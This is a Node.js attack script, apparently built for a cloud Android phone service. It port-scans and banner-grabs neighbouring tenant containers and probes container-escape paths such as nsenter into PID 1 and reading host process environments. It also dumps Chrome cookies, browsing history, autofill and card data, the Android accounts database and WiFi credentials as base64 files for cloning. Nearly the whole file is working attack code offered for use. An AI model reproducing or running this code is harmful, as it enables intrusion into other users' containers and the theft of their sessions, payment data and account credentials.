#!/usr/bin/env node
/**
 * Deep Neighbor Probe — Alternative attack vectors when standard ports are closed
 * 
 * 1. /proc/net/tcp analysis for infra connections
 * 2. Android-specific port probes (adbd, vnc, grpc, armcloud agent)
 * 3. Shared kernel / cgroup / namespace escape paths
 * 4. Infrastructure service discovery (image server, cloud API)
 * 5. Raw nc probes to neighbor containers on non-standard ports
 * 6. Full data extraction from OUR device (base64 dumps)
 */

const path = require('path');
const fs = require('fs');

const { AK, SK, HOST, SVC, CT, SHD, hmacSign, api, sh } = require('../shared/vmos_api');
const PAD = 'ACP250923JS861KJ';
const R = { timestamp: new Date().toISOString(), device: PAD, probes: {} };

const log = m => console.log(`[${new Date().toISOString().slice(11,19)}] ${m}`);
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function main() {
  console.log('═'.repeat(70));
  console.log('  DEEP NEIGHBOR PROBE + DATA EXTRACTION');
  console.log('═'.repeat(70));

  // ── PROBE 1: /proc/net analysis — find all active connections ──
  log('');
  log('PROBE 1: /proc/net/tcp — active connections revealing infrastructure');
  
  const procTcp = await sh([
    'echo "=== ESTABLISHED CONNECTIONS ==="',
    'ss -tnp 2>/dev/null',
    'echo "=== LISTENING ==="',
    'ss -tlnp 2>/dev/null',
    'echo "=== UDP ==="',
    'ss -ulnp 2>/dev/null',
    'echo "=== RAW TCP TABLE ==="',
    'cat /proc/net/tcp 2>/dev/null | head -30',
    'echo "=== UNIX SOCKETS ==="',
    'cat /proc/net/unix 2>/dev/null | wc -l',
    'cat /proc/net/unix 2>/dev/null | grep -E "(adbd|armcloud|vmos|docker|containerd|grpc)" | head -20',
  ].join('\n'), 20);
  R.probes.proc_net = procTcp;
  for (const line of procTcp.split('\n')) { if (line.trim()) log(`  ${line.trim()}`); }

  // ── PROBE 2: Infrastructure service discovery ──────────────────
  log('');
  log('PROBE 2: INFRASTRUCTURE SERVICE DISCOVERY');
  
  // From previous scan: cloud_img = 192.168.50.11:80, cloud_server = openapi-hk.armcloud.net
  const infraProbes = {
    'image_server':   'curl -s -m5 -o /dev/null -w "%{http_code}" http://192.168.50.11/ 2>/dev/null; echo ""',
    'image_server_80':'curl -s -m5 http://192.168.50.11/ 2>/dev/null | head -5',
    'gateway_10.0.0.1':'curl -s -m5 -o /dev/null -w "%{http_code}" http://10.0.0.1/ 2>/dev/null; echo ""',
    'gateway_10.0.0.1_8080':'curl -s -m5 -o /dev/null -w "%{http_code}" http://10.0.0.1:8080/ 2>/dev/null; echo ""',
    'cloud_dns':      'nslookup openapi-hk.armcloud.net 2>/dev/null || getent hosts openapi-hk.armcloud.net 2>/dev/null || echo NO_DNS',
    'dns_server':     'cat /etc/resolv.conf 2>/dev/null',
    'armcloud_props':  'getprop ro.boot.armcloud_server_addr; getprop ro.boot.armcloud_agent_addr 2>/dev/null; getprop ro.boot.armcloud_agent_port 2>/dev/null',
    'cloud_endpoints': 'getprop | grep -i "armcloud\\|cloud.*addr\\|cloud.*port\\|cloud.*server" 2>/dev/null',
  };
  
  R.probes.infra = {};
  for (const [k, cmd] of Object.entries(infraProbes)) {
    const r = await sh(cmd, 12);
    R.probes.infra[k] = r;
    log(`  ${k}: ${r.split('\n')[0].slice(0, 90)}`);
    await sleep(200);
  }

  // ── PROBE 3: Android-specific ports on nearest 20 neighbors ────
  log('');
  log('PROBE 3: ANDROID-SPECIFIC PORT SCAN (5037 adb-host, 5555 adbd, 5900 vnc, 7000 grpc, 8080 http, 9090 armcloud-agent)');
  
  // Pick 20 neighbors (10.0.96.1-20 are probably containers on same host)
  const targets = [];
  for (let i = 1; i <= 20; i++) if (i !== 174) targets.push(`10.0.96.${i}`);
  
  R.probes.android_ports = {};
  for (const host of targets) {
    const portR = await sh([
      `for p in 5037 5555 5900 7000 7070 8080 8443 9090 9100 15555 20000 20001 30000 40000; do`,
      `  (echo >/dev/tcp/${host}/$p 2>/dev/null && echo "O:$p") &`,
      `done; wait`,
    ].join('\n'), 10);
    const open = (portR.match(/O:\d+/g) || []).map(p => p.slice(2));
    R.probes.android_ports[host] = open;
    if (open.length > 0) log(`  ${host}: ✓ OPEN → ${open.join(', ')}`);
    await sleep(100);
  }
  
  const anyOpen = Object.entries(R.probes.android_ports).filter(([_,p]) => p.length > 0);
  log(`  Hosts with open ports: ${anyOpen.length}/${targets.length}`);

  // ── PROBE 4: NC raw probes — banner grab on common ports ───────
  log('');
  log('PROBE 4: NC BANNER GRAB on first 5 neighbors');
  
  R.probes.banners = {};
  for (const host of targets.slice(0, 5)) {
    for (const port of [5555, 8080, 9090]) {
      const banner = await sh(`echo "" | nc -w2 ${host} ${port} 2>/dev/null | head -3; echo NC_DONE`, 8);
      if (banner && !banner.includes('[API_ERR') && banner !== 'NC_DONE') {
        R.probes.banners[`${host}:${port}`] = banner;
        log(`  ${host}:${port} → ${banner.split('\n')[0].slice(0, 60)}`);
      }
    }
    await sleep(100);
  }

  // ── PROBE 5: Container escape — shared kernel/cgroup vectors ───
  log('');
  log('PROBE 5: CONTAINER ESCAPE VECTORS');
  
  const escapeCmds = {
    // Cgroup — can we read host cgroup hierarchy?
    'cgroup_self':      'cat /proc/self/cgroup 2>/dev/null',
    'cgroup_mount':     'mount | grep cgroup 2>/dev/null',
    'cgroup_mem_limit': 'cat /sys/fs/cgroup/memory/memory.limit_in_bytes 2>/dev/null || cat /sys/fs/cgroup/memory.max 2>/dev/null',
    'cgroup_pids':      'cat /sys/fs/cgroup/pids/pids.max 2>/dev/null || cat /sys/fs/cgroup/pids.max 2>/dev/null',
    
    // /proc — can we see host processes?
    'proc_1_cgroup':    'cat /proc/1/cgroup 2>/dev/null',
    'proc_1_mountinfo': 'cat /proc/1/mountinfo 2>/dev/null | head -10',
    'proc_1_environ':   'cat /proc/1/environ 2>/dev/null | tr "\\0" "\\n" | head -20',
    
    // Device-mapper — map underlying block devices
    'dm_table':         'dmsetup table 2>/dev/null | head -10',
    'dm_status':        'dmsetup status 2>/dev/null | head -10',
    
    // Capability check — what caps do we have?
    'capabilities':     'cat /proc/self/status | grep -i cap 2>/dev/null',
    'cap_ambient':      'cat /proc/self/status | grep CapAmb 2>/dev/null',
    'cap_decode':       'capsh --decode=$(cat /proc/self/status | grep CapEff | awk \'{print $2}\') 2>/dev/null || echo NO_CAPSH',
    
    // Kernel exploitation surface
    'kallsyms_sample':  'head -20 /proc/kallsyms 2>/dev/null',
    'modules_count':    'cat /proc/modules 2>/dev/null | wc -l',
    'sysrq':            'cat /proc/sys/kernel/sysrq 2>/dev/null',
    'kptr_restrict':    'cat /proc/sys/kernel/kptr_restrict 2>/dev/null',
    'dmesg_restrict':   'cat /proc/sys/kernel/dmesg_restrict 2>/dev/null',
    
    // nsenter attempt — can we escape namespace?
    'nsenter_test':     'nsenter -t 1 -m -u -i -n -p -- echo HOST_SHELL 2>&1 | head -3',
    
    // /dev access
    'dev_interesting':  'ls -la /dev/binder /dev/hwbinder /dev/vndbinder /dev/ashmem /dev/kmsg /dev/kvm /dev/net/tun /dev/fuse 2>/dev/null',
    
    // SELinux context details
    'selinux_context':  'id -Z 2>/dev/null; cat /proc/self/attr/current 2>/dev/null',
    'selinux_booleans': 'getsebool -a 2>/dev/null | head -20',
  };
  
  R.probes.escape = {};
  for (const [k, cmd] of Object.entries(escapeCmds)) {
    const r = await sh(cmd, 15);
    R.probes.escape[k] = r;
    const preview = r.split('\n')[0].slice(0, 80);
    log(`  ${k}: ${preview}${r.split('\n').length > 1 ? ` (+${r.split('\n').length-1})` : ''}`);
    await sleep(200);
  }

  // ── PROBE 6: Full data extraction from OUR device ──────────────
  log('');
  log('PROBE 6: FULL DATA EXTRACTION (our device — clone reference)');
  
  // 6a: Chrome cookies DB as base64
  log('  6a: Chrome Cookies DB → base64...');
  const cookieB64 = await sh('base64 /data/data/com.android.chrome/app_chrome/Default/Cookies 2>/dev/null | head -500', 20);
  const cookieSize = cookieB64.length;
  R.probes.extracted = { chrome_cookies_b64_chars: cookieSize };
  log(`    Cookies DB: ${cookieSize} base64 chars extracted`);
  if (cookieSize > 100) {
    fs.writeFileSync(path.join(__dirname, '..', 'output') + '/extracted_chrome_cookies.b64', cookieB64);
    log(`    Saved to: extracted_chrome_cookies.b64`);
  }
  
  // 6b: Chrome History DB
  log('  6b: Chrome History DB → base64...');
  const histB64 = await sh('base64 /data/data/com.android.chrome/app_chrome/Default/History 2>/dev/null | head -500', 20);
  R.probes.extracted.chrome_history_b64_chars = histB64.length;
  log(`    History DB: ${histB64.length} base64 chars`);
  if (histB64.length > 100) {
    fs.writeFileSync(path.join(__dirname, '..', 'output') + '/extracted_chrome_history.b64', histB64);
    log(`    Saved to: extracted_chrome_history.b64`);
  }
  
  // 6c: Chrome Web Data (autofill/cards)
  log('  6c: Chrome Web Data → base64...');
  const webB64 = await sh('base64 "/data/data/com.android.chrome/app_chrome/Default/Web Data" 2>/dev/null | head -500', 20);
  R.probes.extracted.chrome_webdata_b64_chars = webB64.length;
  log(`    Web Data: ${webB64.length} base64 chars`);
  if (webB64.length > 100) {
    fs.writeFileSync(path.join(__dirname, '..', 'output') + '/extracted_chrome_webdata.b64', webB64);
  }

  // 6d: accounts_ce.db
  log('  6d: Accounts CE DB...');
  const accB64 = await sh('base64 /data/system_ce/0/accounts_ce.db 2>/dev/null | head -300', 15);
  R.probes.extracted.accounts_ce_b64_chars = accB64.length;
  log(`    accounts_ce.db: ${accB64.length} base64 chars`);
  if (accB64.length > 100) {
    fs.writeFileSync(path.join(__dirname, '..', 'output') + '/extracted_accounts_ce.b64', accB64);
  }

  // 6e: GMS databases
  log('  6e: GMS databases list...');
  const gmsFiles = await sh('ls -la /data/data/com.google.android.gms/databases/ 2>/dev/null', 10);
  R.probes.extracted.gms_files = gmsFiles;
  for (const line of gmsFiles.split('\n').slice(0, 8)) { if (line.trim()) log(`    ${line.trim()}`); }

  // 6f: Full property dump (all system props for clone)
  log('  6f: Full property dump...');
  const allProps = await sh('getprop 2>/dev/null', 20);
  R.probes.extracted.all_props_lines = allProps.split('\n').length;
  fs.writeFileSync(path.join(__dirname, '..', 'output') + '/extracted_all_props.txt', allProps);
  log(`    ${allProps.split('\n').length} properties saved to extracted_all_props.txt`);

  // 6g: Proxy configuration (full detail)
  log('  6g: Proxy config (full)...');
  const proxyFull = await sh([
    'echo "=== PROXY PROPS ==="',
    'getprop ro.sys.cloud.proxy.type',
    'getprop ro.sys.cloud.proxy.mode',
    'getprop ro.sys.cloud.proxy.data',
    'echo "=== IPTABLES NAT ==="',
    'iptables -t nat -L -n -v 2>/dev/null',
    'echo "=== GLOBAL PROXY ==="',
    'settings get global http_proxy 2>/dev/null',
    'settings get global global_http_proxy_host 2>/dev/null',
    'settings get global global_http_proxy_port 2>/dev/null',
    'echo "=== ROUTES ==="',
    'ip route show 2>/dev/null',
    'ip rule show 2>/dev/null',
  ].join('\n'), 20);
  R.probes.extracted.proxy_full = proxyFull;
  fs.writeFileSync(path.join(__dirname, '..', 'output') + '/extracted_proxy_config.txt', proxyFull);
  log(`    Proxy config saved`);
  for (const line of proxyFull.split('\n').slice(0, 10)) { if (line.trim()) log(`    ${line.trim()}`); }

  // 6h: WiFi config
  log('  6h: WiFi config...');
  const wifiConf = await sh('cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null', 15);
  if (wifiConf.length > 50) {
    fs.writeFileSync(path.join(__dirname, '..', 'output') + '/extracted_wifi_config.xml', wifiConf);
    log(`    WiFi config saved (${wifiConf.length} chars)`);
  }

  // ── SAVE REPORT ────────────────────────────────────────────────
  const reportFile = `${path.join(__dirname, '..', 'reports')}/DEEP_PROBE_${Date.now()}.json`;
  fs.writeFileSync(reportFile, JSON.stringify(R, null, 2));
  log(`\nReport saved: ${reportFile}`);

  // ── SUMMARY ────────────────────────────────────────────────────
  console.log('\n' + '═'.repeat(70));
  console.log('  DEEP PROBE SUMMARY');
  console.log('═'.repeat(70));
  console.log(`  Neighbor hosts scanned:    20`);
  console.log(`  Android-port open hosts:   ${anyOpen.length}`);
  console.log(`  Banner grabs:              ${Object.keys(R.probes.banners||{}).length}`);
  console.log(`  Escape vectors tested:     ${Object.keys(R.probes.escape||{}).length}`);
  console.log('');
  console.log('  Extracted Data Files:');
  console.log(`    extracted_chrome_cookies.b64    ${cookieSize} chars`);
  console.log(`    extracted_chrome_history.b64    ${histB64.length} chars`);
  console.log(`    extracted_chrome_webdata.b64    ${webB64.length} chars`);
  console.log(`    extracted_accounts_ce.b64       ${accB64.length} chars`);
  console.log(`    extracted_all_props.txt         ${allProps.split('\n').length} props`);
  console.log(`    extracted_proxy_config.txt`);
  console.log(`    extracted_wifi_config.xml`);
  console.log('');
  
  // Key findings
  const caps = R.probes.escape?.capabilities || '';
  const seCtx = R.probes.escape?.selinux_context || '';
  const nsenter = R.probes.escape?.nsenter_test || '';
  console.log('  Key Escape Findings:');
  console.log(`    SELinux context: ${seCtx.split('\n')[0]}`);
  console.log(`    Capabilities:    ${caps.split('\n')[0]}`);
  console.log(`    nsenter test:    ${nsenter.split('\n')[0]}`);
  console.log(`    sysrq:           ${R.probes.escape?.sysrq || 'n/a'}`);
  console.log(`    kptr_restrict:   ${R.probes.escape?.kptr_restrict || 'n/a'}`);
  console.log('');
  console.log(`  Report: ${reportFile}`);
  console.log('═'.repeat(70));
}

main().catch(e => { console.error('FATAL:', e); process.exit(1); });
